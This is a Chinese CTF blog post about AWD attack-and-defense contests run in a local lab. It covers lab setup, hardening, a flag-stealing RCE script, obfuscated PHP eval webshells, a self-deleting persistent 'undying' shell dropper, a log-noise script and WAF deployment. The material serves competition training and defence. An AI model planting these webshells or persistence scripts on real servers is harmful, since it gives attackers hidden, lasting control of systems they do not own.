@@ -1,0 +1,694 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>AWD | eemotionnの小窝</title>
+    <meta name="author" content="eemotionn" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/eemotionn.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+<script src="https://s4.zstatic.net/ajax/libs/twikoo/1.6.31/twikoo.all.min.js"></script>
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+
+
+    <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+
+<canvas
+    id="background"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"
+></canvas>
+<script src="/js/background.min.js"></script>
+
+<div id="cursor"></div>
+<link rel="stylesheet" href="/css/cursor.min.css" />
+<script src="/js/cursor.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>EEMOTIONNの小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;EEMOTIONNの小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>AWD</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/1/21
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/ctf/" style="color: #03a9f4">
+                    ctf
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>关于ctf线下比赛：AWD的一个小尝试</p>
+<span id="more"></span>
+
+<h2 id="1、靶场环境搭建"><a href="#1、靶场环境搭建" class="headerlink" title="1、靶场环境搭建"></a>1、靶场环境搭建</h2><p>开源AWD项目</p>
+<p>identifiably-platform (gitee.com)](<a target="_blank" rel="noopener" href="https://gitee.com/d3N00t/awd-platform">https://gitee.com/d3N00t/awd-platform</a>)</p>
+<p>VMware导入awd.ova靶机，密码为123</p>
+<pre><code class="shell">cd ~/Downloads/awd-platform
+#创建3个队伍
+python2 batch.py web_yunnan_simple 3
+#启动比赛
+sudo python2 start.py ./ 3
+
+#运行check
+cd check_server/
+python2  check.py
+#Ctrl+C 停止运行
+
+#停止比赛
+cd ~/Downloads/awd-platform
+sudo python2 stop_clean.py
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626214647670-1736744819753-1.png" alt="image-20240626214647670"></p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626210249067.png" alt="image-20240626210249067"></p>
+<p>不同的比赛，规则可能会有区别，但是模式都是一样的，先来看看这个开源项目的规则：</p>
+<ol>
+<li><p>每个队伍分配到一个docker主机，给定ctf用户权限，通过制定的端口和密码进行连接；</p>
+</li>
+<li><p>每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍；</p>
+</li>
+<li><p>比赛开始后，<strong>前30分钟</strong>，选手维护各自的主机，在这个阶段，所有的攻击和服务不可用不影响分数；</p>
+</li>
+<li><p>选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到指定的flag服务器：<a href="http://flag服务器IP:端口/flag_file.php?token=队伍token&flag=获取到的flag">http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag</a> 来获得相应的分数。</p>
+<pre><code>例如：flag server地址为8.8.8.8，端口为8080，队伍token为team1，flag	40ed892b93997142e46124516d0f5ac0
+则请求 http://8.8.8.8:8080/flag_file.php?token=team1&amp;flag=40ed892b93997142e46124516d0f5ac0 来获得相应分数。
+</code></pre>
+<p>每次成功攻击可获得2分，被攻击者扣除2分；有效攻击两分钟一轮；</p>
+<p>5..选手需要保证己方服务的可用性，每次服务不可用扣除1分，服务可用，加1分；<strong>服务检测两分钟一轮</strong>；</p>
+<p>6.选手可以从flag服务器上获取所有的攻击情况以及当前的分数：</p>
+<p>攻击情况url地址：<a href="http://flag服务器IP:端口/result.txt">http://flag服务器IP:端口/result.txt</a></p>
+<p>得分情况地址：<a href="http://flag服务器IP:端口/score.txt">http://flag服务器IP:端口/score.txt</a></p>
+<p>7.<strong>不允许使用任何形式的DOS攻击</strong></p>
+<p>队伍用户名、密码、ssh端口、web端口</p>
+<pre><code class="shell">team1:ctf:51e78b03b57449742da3124b065017d1 ssh端口：2201 web端口：8801
+team2:ctf:6f9d384e6e4d6940d731625f78fa6051 ssh端口：2202 web端口：8802
+team3:ctf:806a9f6218ec788411c85d1e3b3f6da5 ssh端口：2203 web端口：8803
+</code></pre>
+<p>在CTF AWD比赛中，团队每位成员既是一个 hacker（攻击），又是一个 manager（防守）</p>
+<p>比赛形式一般为每个队伍会获取一个GameBox（SSH服务器）</p>
+<p>服务器上搭载了一些服务，有攻击的点，需要寻找服务器上的安全问题</p>
+<p>每个队伍服务器的情况是一样的，也就是你在服务器找到的漏洞，其他队伍的服务器也是一样的</p>
+<p>所以可以找到自己服务器上的安全问题，然后利用这些安全问题，攻击其他队伍的服务器</p>
+<p>被取走flag则扣分，成功攻击其他队伍获得其flag则得分</p>
+<p>主办方会对每个队伍的服务进行 check 服务是否正常，check 不过就扣分，扣除的分值由其他队伍均分</p>
+<p>实时通过得分反映出比赛情况，最终也以得分直接分出胜负。</p>
+</li>
+</ol>
+<h2 id="2、赛前准备"><a href="#2、赛前准备" class="headerlink" title="2、赛前准备"></a>2、赛前准备</h2><p>赛前30分钟十分重要</p>
+<p>主办方SSH服务为：<code>192.168.197.129:2201</code></p>
+<h3 id="2-1-修改密码"><a href="#2-1-修改密码" class="headerlink" title="2.1 修改密码"></a>2.1 修改密码</h3><p>修改ssh密码</p>
+<pre><code class="shell">passwd ctf  
+#修改后的密码 ：Awd123
+</code></pre>
+<p>​	由于主办方设置的默认密码可能存在弱口令问题，因此在获取SSH之后</p>
+<p>​	可以马上利用XShell之类的工具连接我方队伍服务，进行密码修改</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626215627934.png" alt="image-20240626215627934"></p>
+<h3 id="2-2-备份"><a href="#2-2-备份" class="headerlink" title="2.2 备份"></a>2.2 备份</h3><p>比赛开始后，应该马上对服务器资源进行备份</p>
+<p>否则不管是己方人员误操作还是其他队伍人员攻击导致我方服务check失败，而一直丢分</p>
+<p>如果出现服务异常导致check失败，而且无法恢复，只能扣除一定的分值重置服务恢复比赛</p>
+<h4 id="web源码备份"><a href="#web源码备份" class="headerlink" title="web源码备份"></a>web源码备份</h4><p>首要备份目标即为Web服务源码，根据经验，web目录肯定就是Web服务源码目录</p>
+<p><img src="https://github.com/eemotionn/static/blob/main/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626215732283.png" alt="image-20240626215732283"></p>
+<p>将源码导出到本机，完成备份的同时也可以对源码进行代码审计</p>
+<p>如：根据源码中的config.php，掌握数据库连接信息</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626215747984.png" alt="image-20240626215747984"></p>
+<p>此时就可以修改数据库密码以及进行数据库备份。</p>
+<h4 id="修改web管理员密码"><a href="#修改web管理员密码" class="headerlink" title="修改web管理员密码"></a>修改web管理员密码</h4><pre><code class="shell">#以用户root，密码root进入数据库
+mysql -uroot -proot
+
+#选择test库
+use test;
+
+#显示所有表
+show tables;
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626215818619.png" alt="image-20240626215818619"></p>
+<p>根据当前数据库中的表，显然admin表即为Web服务后台管理员用户表，因此修改管理员密码：</p>
+<pre><code class="shell">#查看admin表
+select * from admin;
+
+#修改密码（将admin表中user_name为admin的数据将其user_pass修改为123）
+update admin set user_pass= &#39;123&#39; WHERE user_name = &#39;admin&#39;;
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627140716022.png" alt="image-20240627140716022"></p>
+<pre><code>注意：需要根据规则决定是否修改！比如主办方检测后台正常与否会利用用户登录。如果修改了该用户的密码就会导致登录失败，从而不断被checkdown扣分！！！
+</code></pre>
+<h4 id="修改数据库密码"><a href="#修改数据库密码" class="headerlink" title="修改数据库密码"></a>修改数据库密码</h4><pre><code class="shell"># 修改密码
+set password=password(&#39;root123&#39;);#该命令适用于mysql版本为5.7等旧版本，在8.0及以后的版本中使用命令:
+alter user &#39;root&#39; @ &#39;localhost&#39; identified by &#39;root123&#39;;
+#明确针对本地登录的root用户
+
+flush privileges;
+#退出：ctrl+D
+
+# 验证新密码
+mysql -uroot -proot123
+
+#注意修改密码后，需要让服务
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627140800719.png" alt="image-20240627140800719"></p>
+<h4 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h4><pre><code class="shell">#备份数据库
+mysqldump -uroot -proot123 --all-databases &gt; /tmp/db.sql
+
+#恢复数据库
+mysql -uroot -proot123 &lt; /tmp/db.sql
+</code></pre>
+<h3 id="2-3-探测ip与端口"><a href="#2-3-探测ip与端口" class="headerlink" title="2.3 探测ip与端口"></a>2.3 探测ip与端口</h3><p>在比赛中，主办方往往只会提供一个SSH服务，不会告诉参赛者其他队伍的出口IP或者端口，所以需要利用端口扫描工具对当前C段进行探测，以便拿到其他队伍的地址，从而进行攻击。使用nmap或者其他端口探测工具进行C段探测：</p>
+<pre><code class="shell">nmap 192.168.197.0/24 -p 1-65535 
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141404256.png" alt="image-20240627141404256"></p>
+<p>由于我方ssh端口为2201，根据扫描结果，得出：</p>
+<pre><code>flag 服务器 ： 192.168.197.129：8080；
+
+我方ssh ：192.168.197.129:2201；
+队伍二 ： 192.168.197.129:2202；
+队伍三 ：192.168.197.129：2203；
+
+我方web ：192.168.197.129：8801；
+队伍二 ： 192.168.197.129：8802；
+队伍三 ： 192.168.197.129：8803；
+</code></pre>
+<h3 id="2-4、flag自动提交脚本"><a href="#2-4、flag自动提交脚本" class="headerlink" title="2.4、flag自动提交脚本"></a>2.4、flag自动提交脚本</h3><p>当前主办方虽然提供了提交flag的web页面：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141441353.png" alt="image-20240627141441353"></p>
+<p>但是flag每两分钟刷新一次，同时其他队伍随时可能修复获取flag的漏洞，所以拿到flag后一个个提交效率太低。而且在对抗比赛的时候，因为每个队伍环境都是一致的，在利用某种手段拿下了某个队伍的flag，相同的方式也能拿到其他队伍的flag。所以假设在掌握了某个漏洞后，不管是拿更多其他队伍的Flag，还是拿下Flag后提交，准备脚本自动提交非常有必要。</p>
+<p>假设挖掘到RCE漏洞能够读取flag：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141455376.png" alt="image-20240627141455376"></p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141502944.png" alt="image-20240627141502944"></p>
+<p>点击执行，观察数据包为post提交：”shell: cat ..&#x2F;flag”数据从而获取flag。</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141517242.png" alt="image-20240627141517242"></p>
+<p>编写批量脚本</p>
+<pre><code class="python">#coding=utf-8
+import requests
+
+submitFlag =&quot;http://192.168.197.129:8080/flag_file.php?token=team1&amp;flag=&quot;;
+
+data=&#123;
+    &quot;shell&quot;:&quot;cat ../flag&quot;
+&#125;
+# 目标URL
+for i in range(8802,8804):
+    # 获取各个队伍flag
+    url = &quot;http://192.168.197.129:&quot;+str(i)+&quot;/footer.php&quot;
+    response = requests.post(url, data=data)
+    if response.status_code == requests.codes.ok:
+        print(str(i)+&quot;:&quot;+response.text)
+        # 提交flag
+        requests.get(submitFlag+response.text)
+</code></pre>
+<h3 id="2-5、工具集"><a href="#2-5、工具集" class="headerlink" title="2.5、工具集"></a>2.5、工具集</h3><p>在进行AWD比赛时，需要将exp攻击脚本、waf防火墙等各种工具提前准备好，因为可能不被允许访问互联网，这意味着，比如当发现某些Nday漏洞时，临时再去下载对应的攻击利用脚本是行不通的。工具集可以在平时逐渐积累与整理。</p>
+<p>虽然在CTF AWD比赛中，团队每位成员既是一个 “红队”，又是”蓝队”。但更清晰的思路梳理，接下来还是从红队和蓝队不同的角度分析。</p>
+<h2 id="3、红队（攻击）"><a href="#3、红队（攻击）" class="headerlink" title="3、红队（攻击）"></a>3、红队（攻击）</h2><p>在AWD比赛过程中，负责攻击的队友要做的事情，就和之前课程讲的一样</p>
+<p>先进行服务、端口、系统等等信息的收集，利用Nessus、AWVS之类的工具来进行漏洞扫描</p>
+<p>结合人工探查、代码审计等等手段找到漏洞，在找到一个漏洞修复的同时，因为各队伍环境一致</p>
+<p>因此也可以利用这个漏洞攻击其他队伍来得分</p>
+<p>这种对抗本质上就是速度和思路上的比拼</p>
+<p>我方先于其他队伍挖掘出漏洞，除了修复己方该漏洞之外，同时也可以利用漏洞攻击其他队伍得分</p>
+<p>其实主要的技术在前期的课程中都已经过学习，而且参与比赛的人员都知道就是这些手段</p>
+<p>所以接下来主要和大家分享一些需要注意的问题与技巧</p>
+<h3 id="3-1、shell不复用"><a href="#3-1、shell不复用" class="headerlink" title="3.1、shell不复用"></a>3.1、shell不复用</h3><p>在比赛中，权限的维持大部分依靠webshell。往往会出现这样的情况</p>
+<pre><code>A队伍批量攻击所有参赛者时，未进行Shell名称或密码或内容加以隐藏，导致其他队伍的WebShell地址、密码完全一致。
+这样就会导致其他队伍如果发现了这个WebShell，也能利用A队伍的这个WebShell对其他队伍攻击
+甚至设置自己的WebShell，将A的WebShell删除。让A队伍给他人做了嫁衣。
+</code></pre>
+<p>而Shell不复用则是为了解决以上问题。一个最简单的例子：</p>
+<pre><code class="shell"># 队伍2
+$pwd = md5(&#39;2202&#39;);  #dd28e50635038e9cf3a648c2dd17ad0a
+# 队伍3
+$pwd = md5(&#39;2203&#39;);  #2d969e2cee8cfa07ce7ca0bb13c7a36d
+摘要算法
+MD5
+phpstorm内置 ：echo md5(&quot;2202&quot;);
+sha1 echo sha1(&quot;2201&quot;);
+</code></pre>
+<pre><code class="shell">&lt;?php
+# 队伍2木马 t2.php
+@eval($_POST[&#39;dd28e50635038e9cf3a648c2dd17ad0a&#39;]);
+?&gt;
+</code></pre>
+<pre><code class="shell"># 队伍3木马 t3.php
+&lt;?php
+@eval($_POST[&#39;2d969e2cee8cfa07ce7ca0bb13c7a36d&#39;]);
+?&gt;
+</code></pre>
+<p>将不同的队伍的WebShell密码变成一个不可逆的MD5值，假设队伍2发现了自己的服务存在一个WebShell，其密码为：dd28e50635038e9cf3a648c2dd17ad0a</p>
+<p>也只能猜测出密码为某个数据的MD5加密值，但是无从得知该MD5值利用什么数据加密计算而得（不可逆）</p>
+<p>因此就算队伍2发现队伍3同样地址存在WebShell，也无法利用</p>
+<p>因为队伍3的WebShell密码为：2d969e2cee8cfa07ce7ca0bb13c7a36d，该密码队伍2无从得知</p>
+<p>为了让WebShell更加隐蔽也可以对木马进行混淆：</p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/Dyan_code/webshell-venom">webshell-venom: 免杀webshell无限生成工具(利用随机异或无限免杀D盾) (gitee.com)</a></p>
+<pre><code>资料库中：webshell-venom.zip
+</code></pre>
+<pre><code># 需要基于python3
+# 对t2.php加密 
+python3 php_venom_3.3.py t2.php 
+
+#运行过程可能缺少chardet模块，使用pip安装：
+pip3 install chardet -i https://mirrors.aliyun.com/pypi/simple/
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144401535.png" alt="image-20240627144401535"></p>
+<h3 id="3-2、不死马（内存马）"><a href="#3-2、不死马（内存马）" class="headerlink" title="3.2、不死马（内存马）"></a>3.2、不死马（内存马）</h3><p>已方的WebShell可能随时被其他队伍进行查杀。所谓的不死马就能为了加大WebShell的查杀难度。常见的不死马如下：<strong>shell.html.php</strong></p>
+<pre><code class="php">&lt;?php
+//让脚本以进程运行
+ignore_user_abort(true);
+set_time_limit(0);
+//删除本文件
+unlink(__FILE__);
+// 以.开头隐藏文件
+$file = &#39;.shell.php&#39;;
+// 写入木马到隐藏文件
+$shell = &quot;&lt;?php @eval(\$_POST[&#39;dd28e50635038e9cf3a648c2dd17ad0a&#39;]); ?&gt;&quot;;
+file_put_contents($file, $shell);
+
+#循环写入木马
+while(true)&#123;
+    file_put_contents($file, $shell);
+    usleep(5000);
+&#125;
+?&gt;
+</code></pre>
+<p>假设成功获得本次靶场其他队伍后台账户，进行登录：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144448884.png" alt="image-20240627144448884"></p>
+<p>**登录成功后滑动到最底部出现文件上传功能：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144503220.png" alt="image-20240627144503220"></p>
+<p><strong>将生成不死马脚本上传：</strong></p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144522053.png" alt="image-20240627144522053"></p>
+<p>访问上传后的不死马脚本文件：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144540057.png" alt="image-20240627144540057"></p>
+<p><strong>观察文件夹内容：</strong></p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144552079.png" alt="image-20240627144552079"></p>
+<p><strong>此时 .shell.php不死马其实并不是无法删除，而是删除后马上又会创建。在不死马被清除前，可以持续利用其完成控制。</strong></p>
+<pre><code class="shell">http://192.168.79.155:8802/admin/upload/.shell.php
+#post data
+dd28e50635038e9cf3a648c2dd17ad0a=phpinfo();
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144634965.png" alt="image-20240627144634965"></p>
+<h3 id="3-3、混淆干扰"><a href="#3-3、混淆干扰" class="headerlink" title="3.3、混淆干扰"></a>3.3、混淆干扰</h3><p>在比赛时，为了混淆视听，加大对手的分析难度，参赛者可以提前准备一些混淆流量脚本，最简单的方式就是通过自动化攻击过程中随机发送payload。</p>
+<p>其实就是向其他队伍的服务发送垃圾数据包，其他队伍的人不管是人工还是借助一些自动的脚本进行日志分析的时候，这些垃圾数据包就会干扰他们。</p>
+<pre><code>注意：发送垃圾数据包，也需掌握好度。不要跑几十上百个线程冲击其他队伍服务，因为这会导致行成DDOS攻击，DDOS攻击在规则中一般是不允许的。
+</code></pre>
+<p>比如简单的混淆脚本如下（Python3）：</p>
+<pre><code class="python">import requests
+import threading
+import time
+
+base = &#39;http://192.168.253.140&#39;
+# 比较常见的地址
+file = &#123;&#39;index.php&#39;, &#39;config.php&#39;, &#39;about.php&#39;, &#39;search.php&#39;&#125;
+# 会吸引防守人员的数据包
+payload = &#123;&#39;cat flag&#39;, &#39;ls&#39;, &#39;rm *&#39;, &#39;echo &lt;?php&#39;,&quot;flag&quot;,&quot;select&quot;&#125;
+# 队伍干扰线程集合
+teams = []
+
+def attach(url):
+    while (1):
+        for f in file:
+            url = url + &#39;/&#39; + f
+            for d in payload:
+                data = &#123;
+                    &#39;payload&#39;: d
+                &#125;
+                requests.post(url, data=data)
+                print(url + &#39;|&#39; + f + &#39;|&#39; + d)
+                # 延迟0.5秒
+                time.sleep(0.5)
+                
+for i in range(8802, 8804):
+    url = base + &quot;:&quot; + str(i)
+    t = threading.Thread(target=attach, args=(url,))
+    teams.append(t)
+    t.start()
+for thread in teams:
+    thread.join()
+</code></pre>
+<p>想象一下，假如我们看到这样的数据包在请求己方的服务</p>
+<p>会不会怀疑有人在攻击，或者正在获取我方的flag？</p>
+<p>此时肯定就需要花时间去排查</p>
+<p>然而结果花了大量时间进行排查，发现其实并没有问题</p>
+<p>这就是在耽误其他参赛选手的时间，耽误其他队伍人员的时间</p>
+<p>就是在为己方的团队争取时间！</p>
+<h3 id="3-4、总结"><a href="#3-4、总结" class="headerlink" title="3.4、总结"></a>3.4、总结</h3><p>攻击其实就是前期课程中各种漏洞、渗透测试以及代码审计相关的内容</p>
+<p>包括Web服务中间件、框架等等相对应的信息采集，然后积累的漏洞利用工具与脚本进行渗透等等</p>
+<p>前文中提到比赛中考验的就是速度和思路，其实还有一个关键点就是：心态</p>
+<p>处于落后劣势时，心态不要崩，在比赛中也有强队在开始落后，后来逆袭成为第一的情况</p>
+<p>对于己方被打，也可以在分析得出相应的payload后，尝试利用相同的方式攻击其他参赛队伍</p>
+<p>同时假设己方服务器被设置了shell，除了立即删除之外，也要有这样的思路：其他队伍是否也被设置了相同的shell？</p>
+<p>设置我方shell的攻击队伍不进行shell不复用处理，导致其他队伍的shell路径、密码全部一样，也是可能存在的，所以我方也可以尝试进行利用！</p>
+<h2 id="4、蓝队（防守）"><a href="#4、蓝队（防守）" class="headerlink" title="4、蓝队（防守）"></a>4、蓝队（防守）</h2><p>前期应急响应其实就是蓝队的范围</p>
+<p>但是与应急响应中的事后处置&#x2F;溯源不同的是，对抗过程是一个实时的</p>
+<p>在AWD比赛开始后一般会有一些时间让我们去提前做些准备</p>
+<p>所以需要抓紧时间做好各项防御准备，如部署WAF、文件监控、流量监控等等</p>
+<p>因为时间有限，可能并不能够完全准备完成，而且没有固定的先做什么再做什么</p>
+<h3 id="4-1、短文件"><a href="#4-1、短文件" class="headerlink" title="4.1、短文件"></a>4.1、短文件</h3><p>因为AWD比赛往往参赛人员水平参差不齐，所以为了照顾大部分参赛群体，出题人往往会设置一些简单的漏洞</p>
+<p>比如靶场中Web源码根目录下的a.php</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145027645.png" alt="image-20240627145027645"></p>
+<p>其内容为：</p>
+<pre><code>&lt;?php @eval($_REQUEST[&#39;c&#39;]);
+var_dump($_SERVER);
+?&gt;
+</code></pre>
+<p>因此可以利用一个简单的命令快速找到这种行数最短的文件，从而分析其是否存在漏洞</p>
+<pre><code class="shell">find /web/ -name &#39;*.php&#39; | xargs wc -l |sort -u
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145117750.png" alt="image-20240627145117750"></p>
+<p>同时也可以直接借助D盾等Web查杀工具，将后门进行删除</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145144191.png" alt="image-20240627145144191"></p>
+<p>选择下载的Web服务源码目录即可</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145152943.png" alt="image-20240627145152943"></p>
+<h3 id="4-2、Waf部署"><a href="#4-2、Waf部署" class="headerlink" title="4.2、Waf部署"></a>4.2、Waf部署</h3><p>任何比赛，首先需要先了解其的规则，一般是不允许使用的成熟的waf产品</p>
+<p>因此需要提前准备好各种不同特点的waf脚本，在需要时随时快速完成部署</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/leohearts/awd-watchbird">GitHub - leohearts&#x2F;awd-watchbird: A powerful PHP WAF for AWD</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/DasSecurity-HatLab/AoiAWD">GitHub - DasSecurity-HatLab&#x2F;AoiAWD: AoiAWD-专为比赛设计，便携性好，低权限运行的EDR系统。</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/1132603216/php-waf">GitHub - 1132603216&#x2F;php-waf: 线上awd攻防waf</a></p>
+<p>以资料中的waf.php为例，批量配置waf </p>
+<pre><code class="shell">#在服务器根目录执行
+#/web 目录下每个 php 文件前加上 &lt;?php require_once &quot;waf.php&quot;;?&gt;
+find /web/ -type f -name &#39;*.php&#39;|xargs sed -i &#39;1i&lt;?php require_once &quot;waf.php&quot;;?&gt;&#39;
+</code></pre>
+<p>讲waf.php上传到服务器根目录</p>
+<pre><code>注意：先批量配置waf，再上传waf.php，否则waf.php中也会包含：&lt;?php require_once &quot;waf.php&quot;;?&gt; 
+虽然PHP中自己包含自己也没问题，但是让人不舒服。
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145450738.png" alt="image-20240627145450738"></p>
+<p>效果</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145557894.png" alt="image-20240627145557894"></p>
+<p>进行SQL注入攻击，输入</p>
+<pre><code class="sql">-1 union select version(),user(),@@version_compile_os
+</code></pre>
+<p>此时该WAF在**&#x2F;tmp&#x2F;waflog**目录下记录日志</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145639222.png" alt="image-20240627145639222"></p>
+<p>waf.php只是记录请求的数据日志，并未进行拦截</p>
+<p>若需要拦截，也只需在判定为攻击后，加入以下代码</p>
+<pre><code class="php">die(&quot;fuck hack&quot;);
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145702351.png" alt="image-20240627145702351"></p>
+<h3 id="4-3、web流量控制"><a href="#4-3、web流量控制" class="headerlink" title="4.3、web流量控制"></a>4.3、web流量控制</h3><p>waf中其实已经完成了流量数据的记录，可以通过tail指令够实时查看流量数据</p>
+<pre><code>tail -f /tmp/waflog/req.log
+tail -f /tmp/waflog/attact.log
+</code></pre>
+<p>另外也有针对web流量抓取、分析的可视化应用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wupco/weblogger?tab=readme-ov-file">GitHub - wupco&#x2F;weblogger: 针对ctf线下赛流量抓取(php)、真实环境流量抓取分析的工具</a></p>
